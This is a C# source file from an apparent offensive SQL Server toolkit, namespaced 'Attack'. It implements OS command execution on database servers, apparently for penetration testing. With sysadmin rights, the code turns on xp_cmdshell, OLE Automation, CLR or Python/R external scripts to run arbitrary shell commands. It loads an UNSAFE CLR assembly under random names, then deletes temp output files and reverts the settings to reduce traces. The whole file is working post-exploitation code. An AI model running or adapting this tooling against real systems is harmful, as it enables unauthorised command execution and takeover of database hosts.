using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpUpSQL.Common;
using SharpUpSQL.Core.Auth;
using SharpUpSQL.Core.Execution;
using SharpUpSQL.Core.Helpers;
using SharpUpSQL.Core.Output;

namespace SharpUpSQL.Attack
{
    public enum OsCommandChannel
    {
        XpCmdshell,
        Clr,
        Ole,
        Python,
        R
    }

    internal sealed class OsCommandRequest
    {
        public SqlConnectionOptions Options { get; set; }
        public string Instance { get; set; }
        public string Command { get; set; }
        public OsCommandChannel Channel { get; set; }
        public VerboseWriter Verbose { get; set; }
        public bool SuppressVerbose { get; set; }
    }

    internal static class OsCommandEngine
    {
        internal static SqlOsCommandResult Execute(OsCommandRequest request)
        {
            var instance = string.IsNullOrWhiteSpace(request.Instance)
                ? Environment.MachineName
                : request.Instance;
            var computerName = InstanceHelper.GetComputerName(instance);
            var options = request.Options.Clone();
            options.Instance = instance;

            try
            {
                var test = ConnectionTester.Test(instance, null, null, options, request.Verbose, request.SuppressVerbose);
                if (!string.Equals(test.Status, "Accessible", StringComparison.OrdinalIgnoreCase))
                {
                    return Fail(computerName, instance, "Not Accessible");
                }

                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Connection Success.");
                }

                if (!IsSysadmin(options, instance, request.Verbose, request.SuppressVerbose))
                {
                    if (!request.SuppressVerbose)
                    {
                        request.Verbose.Write(instance + " : You are not a sysadmin. This command requires sysadmin privileges.");
                    }

                    return Fail(computerName, instance, "No sysadmin privileges.");
                }

                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : You are a sysadmin.");
                }

                string output;
                switch (request.Channel)
                {
                    case OsCommandChannel.XpCmdshell:
                        output = ExecuteXpCmdshell(options, instance, request);
                        break;
                    case OsCommandChannel.Clr:
                        output = ExecuteClr(options, instance, request);
                        break;
                    case OsCommandChannel.Ole:
                        output = ExecuteOle(options, instance, request);
                        break;
                    case OsCommandChannel.Python:
                        output = ExecuteExternalScript(options, instance, request, "Python");
                        break;
                    case OsCommandChannel.R:
                        output = ExecuteExternalScript(options, instance, request, "R");
                        break;
                    default:
                        output = "Unsupported channel.";
                        break;
                }

                return new SqlOsCommandResult
                {
                    ComputerName = computerName,
                    Instance = instance,
                    CommandResults = output ?? string.Empty
                };
            }
            catch (Exception)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Connection Failed.");
                }

                return Fail(computerName, instance,
                    request.Channel == OsCommandChannel.Ole ||
                    request.Channel == OsCommandChannel.Python ||
                    request.Channel == OsCommandChannel.R
                        ? "Not Accessible or Command Failed"
                        : "Not Accessible");
            }
        }

        private static SqlOsCommandResult Fail(string computerName, string instance, string message)
        {
            return new SqlOsCommandResult
            {
                ComputerName = computerName,
                Instance = instance,
                CommandResults = message
            };
        }

        private static bool IsSysadmin(
            SqlConnectionOptions options,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            var check = SqlEnumerationEngine.GetSqlSysadminCheck(options, instance, verbose, true).FirstOrDefault();
            return check != null &&
                   string.Equals(check.IsSysadmin, "Yes", StringComparison.OrdinalIgnoreCase);
        }

        private static int GetConfigValue(
            SqlConnectionOptions options,
            string configName,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            var rows = QueryExecutor.ExecuteQuery(
                options,
                "sp_configure '" + configName.Replace("'", "''") + "'",
                verbose,
                true);
            var row = rows.FirstOrDefault();
            if (row == null || !row.ContainsKey("config_value"))
            {
                return 0;
            }

            int value;
            return int.TryParse(Convert.ToString(row["config_value"]), out value) ? value : 0;
        }

        private static bool EnsureShowAdvanced(
            SqlConnectionOptions options,
            string instance,
            OsCommandRequest request,
            ref bool restore)
        {
            if (GetConfigValue(options, "Show Advanced Options", request.Verbose, true) == 1)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Show Advanced Options is already enabled.");
                }

                return true;
            }

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Show Advanced Options is disabled.");
            }

            restore = true;
            QueryExecutor.ExecuteNonQuery(
                options,
                "sp_configure 'Show Advanced Options',1;RECONFIGURE",
                request.Verbose,
                true);

            if (GetConfigValue(options, "Show Advanced Options", request.Verbose, true) != 1)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Enabling Show Advanced Options failed. Aborting.");
                }

                return false;
            }

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Enabled Show Advanced Options.");
            }

            return true;
        }

        private static void RestoreShowAdvanced(
            SqlConnectionOptions options,
            string instance,
            bool restore,
            OsCommandRequest request)
        {
            if (!restore)
            {
                return;
            }

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Disabling Show Advanced Options");
            }

            QueryExecutor.ExecuteNonQuery(
                options,
                "sp_configure 'Show Advanced Options',0;RECONFIGURE",
                request.Verbose,
                true);
        }

        private static string ExecuteXpCmdshell(
            SqlConnectionOptions options,
            string instance,
            OsCommandRequest request)
        {
            var restoreAdvanced = false;
            var restoreXp = false;

            if (!EnsureShowAdvanced(options, instance, request, ref restoreAdvanced))
            {
                return "Could not enable Show Advanced Options.";
            }

            if (GetConfigValue(options, "xp_cmdshell", request.Verbose, true) == 1)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : xp_cmdshell is already enabled.");
                }
            }
            else
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : xp_cmdshell is disabled.");
                }

                restoreXp = true;
                QueryExecutor.ExecuteNonQuery(
                    options,
                    "sp_configure 'xp_cmdshell',1;RECONFIGURE",
                    request.Verbose,
                    true);

                if (GetConfigValue(options, "xp_cmdshell", request.Verbose, true) != 1)
                {
                    RestoreShowAdvanced(options, instance, restoreAdvanced, request);
                    if (!request.SuppressVerbose)
                    {
                        request.Verbose.Write(instance + " : Enabling xp_cmdshell failed. Aborting.");
                    }

                    return "Could not enable xp_cmdshell.";
                }

                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Enabled xp_cmdshell.");
                }
            }

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Running command: " + request.Command);
            }

            var query = "EXEC master..xp_cmdshell " + SqlValueFormatter.QuoteLiteral(request.Command);
            var output = CollectOutputColumn(options, query, "output", request.Verbose, request.SuppressVerbose);

            if (restoreXp)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Disabling xp_cmdshell");
                }

                QueryExecutor.ExecuteNonQuery(
                    options,
                    "sp_configure 'xp_cmdshell',0;RECONFIGURE",
                    request.Verbose,
                    true);
            }

            RestoreShowAdvanced(options, instance, restoreAdvanced, request);
            return output;
        }

        private static string ExecuteExternalScript(
            SqlConnectionOptions options,
            string instance,
            OsCommandRequest request,
            string language)
        {
            var restoreAdvanced = false;
            var restoreExternal = false;

            if (!EnsureShowAdvanced(options, instance, request, ref restoreAdvanced))
            {
                return "Could not enable Show Advanced Options.";
            }

            if (GetConfigValue(options, "external scripts enabled", request.Verbose, true) == 1)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : External scripts are already enabled.");
                }
            }
            else
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : External scripts are disabled.");
                }

                restoreExternal = true;
                QueryExecutor.ExecuteNonQuery(
                    options,
                    "sp_configure 'external scripts enabled',1;RECONFIGURE WITH OVERRIDE",
                    request.Verbose,
                    true);

                if (GetConfigValue(options, "external scripts enabled", request.Verbose, true) != 1)
                {
                    RestoreShowAdvanced(options, instance, restoreAdvanced, request);
                    if (!request.SuppressVerbose)
                    {
                        request.Verbose.Write(instance + " : Enabling external scripts failed. Aborting.");
                    }

                    return "Could not enable external scripts.";
                }

                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Enabled external scripts.");
                }
            }

            var runtimeRows = QueryExecutor.ExecuteQuery(
                options,
                "SELECT value_in_use FROM master.sys.configurations WHERE name LIKE 'external scripts enabled'",
                request.Verbose,
                true);
            var runtime = runtimeRows.FirstOrDefault();
            if (runtime != null &&
                string.Equals(Convert.ToString(runtime["value_in_use"]), "0", StringComparison.OrdinalIgnoreCase))
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : The 'external scripts enabled' setting is not enabled in runtime.");
                    request.Verbose.Write(instance + " : - The SQL Server service will need to be manually restarted for the change to take effect.");
                }

                RestoreExternal(options, instance, restoreExternal, restoreAdvanced, request);
                return "External scripts not enabled in runtime.";
            }

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Executing command: " + request.Command);
            }

            string query;
            if (string.Equals(language, "R", StringComparison.OrdinalIgnoreCase))
            {
                query = @"
EXEC sp_execute_external_script
  @language=N'R',
  @script=N'OutputDataSet <- data.frame(shell(""" + request.Command.Replace("\"", "\\\"") + @""",intern=T))'
  WITH RESULT SETS (([Output] varchar(max)));";
            }
            else
            {
                query = @"
EXEC sp_execute_external_script
    @language =N'Python',
    @script=N'
import subprocess
p = subprocess.Popen(""cmd.exe /c " + request.Command.Replace("\"", "`\"") + @""", stdout=subprocess.PIPE)
OutputDataSet = pandas.DataFrame([str(p.stdout.read(), ""utf-8"")])'
WITH RESULT SETS (([Output] nvarchar(max)))";
            }

            var dbOverride = request.Options.Database;
            if (!string.IsNullOrWhiteSpace(dbOverride) &&
                !string.Equals(dbOverride, "Master", StringComparison.OrdinalIgnoreCase))
            {
                options.Database = dbOverride;
            }

            var output = CollectOutputColumn(options, query, "Output", request.Verbose, request.SuppressVerbose);
            RestoreExternal(options, instance, restoreExternal, restoreAdvanced, request);
            return output != null ? output.Trim() : string.Empty;
        }

        private static void RestoreExternal(
            SqlConnectionOptions options,
            string instance,
            bool restoreExternal,
            bool restoreAdvanced,
            OsCommandRequest request)
        {
            if (restoreExternal)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Disabling external scripts");
                }

                QueryExecutor.ExecuteNonQuery(
                    options,
                    "sp_configure 'external scripts enabled',0;RECONFIGURE WITH OVERRIDE",
                    request.Verbose,
                    true);
            }

            RestoreShowAdvanced(options, instance, restoreAdvanced, request);
        }

        private static string ExecuteOle(
            SqlConnectionOptions options,
            string instance,
            OsCommandRequest request)
        {
            var restoreAdvanced = false;
            var restoreOle = false;

            if (!EnsureShowAdvanced(options, instance, request, ref restoreAdvanced))
            {
                return "Could not enable Show Advanced Options.";
            }

            if (GetConfigValue(options, "Ole Automation Procedures", request.Verbose, true) == 1)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Ole Automation Procedures are already enabled.");
                }
            }
            else
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Ole Automation Procedures are disabled.");
                }

                restoreOle = true;
                QueryExecutor.ExecuteNonQuery(
                    options,
                    "sp_configure 'Ole Automation Procedures',1;RECONFIGURE",
                    request.Verbose,
                    true);

                if (GetConfigValue(options, "Ole Automation Procedures", request.Verbose, true) != 1)
                {
                    RestoreShowAdvanced(options, instance, restoreAdvanced, request);
                    return "Could not enable Ole Automation Procedures.";
                }

                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Enabled Ole Automation Procedures.");
                }
            }

            var outputFile = RandomName(5);
            var outputPath = @"c:\windows\temp\" + outputFile + ".txt";

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Executing command: " + request.Command);
            }

            var runQuery = string.Format(@"
DECLARE @Shell INT
DECLARE @Output varchar(8000)
EXEC @Output = Sp_oacreate 'wscript.shell', @Shell Output, 5
EXEC Sp_oamethod @shell, 'run' , null, 'cmd.exe /c ""{0} > {1}""'",
                request.Command.Replace("\"", "\"\""),
                outputPath);

            QueryExecutor.ExecuteNonQuery(options, runQuery, request.Verbose, true);

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Reading command output from " + outputPath);
            }

            var readQuery = string.Format(@"
DECLARE @fso INT
DECLARE @file INT
DECLARE @o int
DECLARE @f int
DECLARE @ret int 
DECLARE @FileContents varchar(8000) 
EXEC Sp_oacreate 'scripting.filesystemobject' , @fso Output, 5
EXEC Sp_oamethod @fso, 'opentextfile' , @file Out, '{0}',1
EXEC sp_oacreate 'scripting.filesystemobject', @o out 
EXEC sp_oamethod @o, 'opentextfile', @f out, '{0}', 1 
EXEC @ret = sp_oamethod @f, 'readall', @FileContents out 
SELECT @FileContents as output", outputPath);

            var output = CollectOutputColumn(options, readQuery, "output", request.Verbose, request.SuppressVerbose);

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Removing file " + outputPath);
            }

            var deleteQuery = string.Format(@"
DECLARE @Shell INT
EXEC Sp_oacreate 'wscript.shell' , @shell Output, 5
EXEC Sp_oamethod @Shell, 'run' , null, 'cmd.exe /c ""del {0}""' , '0' , 'true'", outputPath);
            QueryExecutor.ExecuteNonQuery(options, deleteQuery, request.Verbose, true);

            if (restoreOle)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Disabling 'Ole Automation Procedures");
                }

                QueryExecutor.ExecuteNonQuery(
                    options,
                    "sp_configure 'Ole Automation Procedures',0;RECONFIGURE",
                    request.Verbose,
                    true);
            }

            RestoreShowAdvanced(options, instance, restoreAdvanced, request);
            return output != null ? output.Trim() : string.Empty;
        }

        private static string ExecuteClr(
            SqlConnectionOptions options,
            string instance,
            OsCommandRequest request)
        {
            var restoreAdvanced = false;
            var restoreClr = false;

            if (!EnsureShowAdvanced(options, instance, request, ref restoreAdvanced))
            {
                return "Could not enable Show Advanced Options.";
            }

            if (GetConfigValue(options, "CLR Enabled", request.Verbose, true) == 1)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : CLR is already enabled.");
                }
            }
            else
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : CLR is disabled.");
                }

                restoreClr = true;
                QueryExecutor.ExecuteNonQuery(
                    options,
                    "sp_configure 'CLR Enabled',1;RECONFIGURE",
                    request.Verbose,
                    true);

                if (GetConfigValue(options, "CLR Enabled", request.Verbose, true) != 1)
                {
                    RestoreShowAdvanced(options, instance, restoreAdvanced, request);
                    return "Could not enable CLR.";
                }

                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Enabled CLR.");
                }
            }

            var assemblyName = RandomName(8, 15);
            var procName = RandomName(8, 15);
            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Assembly name: " + assemblyName);
                request.Verbose.Write(instance + " : CLR Procedure name: " + procName);
            }

            var msdb = options.Clone();
            msdb.Database = "msdb";

            var build = ClrDllGenerator.BuildAssembly(request.Command, assemblyName, "StoredProcedures", "cmd_exec");
            if (build.DllBytes == null || build.DllBytes.Length == 0)
            {
                RestoreClr(options, instance, restoreClr, restoreAdvanced, request);
                return build.Error ?? "Failed to build CLR assembly.";
            }

            var hex = BitConverter.ToString(build.DllBytes).Replace("-", string.Empty);
            QueryExecutor.ExecuteNonQuery(
                msdb,
                "CREATE ASSEMBLY [" + assemblyName + "] AUTHORIZATION [dbo] FROM 0x" + hex + " WITH PERMISSION_SET = UNSAFE",
                request.Verbose,
                true);

            QueryExecutor.ExecuteNonQuery(
                msdb,
                "CREATE PROCEDURE [dbo].[" + procName + "] @execCommand NVARCHAR (MAX) AS EXTERNAL NAME [" +
                assemblyName + "].[StoredProcedures].[cmd_exec]",
                request.Verbose,
                true);

            if (!request.SuppressVerbose)
            {
                request.Verbose.Write(instance + " : Running command: " + request.Command);
            }

            var output = CollectOutputColumn(
                msdb,
                "EXEC [" + procName + "] " + SqlValueFormatter.QuoteLiteral(request.Command),
                "output",
                request.Verbose,
                request.SuppressVerbose);

            QueryExecutor.ExecuteNonQuery(msdb, "DROP PROCEDURE [" + procName + "]", request.Verbose, true);
            QueryExecutor.ExecuteNonQuery(msdb, "DROP ASSEMBLY [" + assemblyName + "]", request.Verbose, true);
            RestoreClr(options, instance, restoreClr, restoreAdvanced, request);
            return output ?? string.Empty;
        }

        private static void RestoreClr(
            SqlConnectionOptions options,
            string instance,
            bool restoreClr,
            bool restoreAdvanced,
            OsCommandRequest request)
        {
            if (restoreClr)
            {
                if (!request.SuppressVerbose)
                {
                    request.Verbose.Write(instance + " : Disabling CLR");
                }

                QueryExecutor.ExecuteNonQuery(
                    options,
                    "sp_configure 'CLR Enabled',0;RECONFIGURE",
                    request.Verbose,
                    true);
            }

            RestoreShowAdvanced(options, instance, restoreAdvanced, request);
        }

        private static string CollectOutputColumn(
            SqlConnectionOptions options,
            string query,
            string column,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            var rows = QueryExecutor.ExecuteQuery(options, query, verbose, suppressVerbose);
            var builder = new StringBuilder();
            foreach (var row in rows)
            {
                object value;
                if (row.TryGetValue(column, out value) && value != null)
                {
                    if (builder.Length > 0)
                    {
                        builder.AppendLine();
                    }

                    builder.Append(value);
                }
            }

            return builder.ToString();
        }

        private static string RandomName(int minLen, int maxLen)
        {
            var random = new Random(Guid.NewGuid().GetHashCode());
            var length = random.Next(minLen, maxLen + 1);
            var chars = new char[length];
            for (var i = 0; i < length; i++)
            {
                chars[i] = (char)random.Next(65, 91);
            }

            return new string(chars);
        }

        private static string RandomName(int length)
        {
            const string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var random = new Random(Guid.NewGuid().GetHashCode());
            var chars = new char[length];
            for (var i = 0; i < length; i++)
            {
                chars[i] = alphabet[random.Next(alphabet.Length)];
            }

            return new string(chars);
        }
    }
}
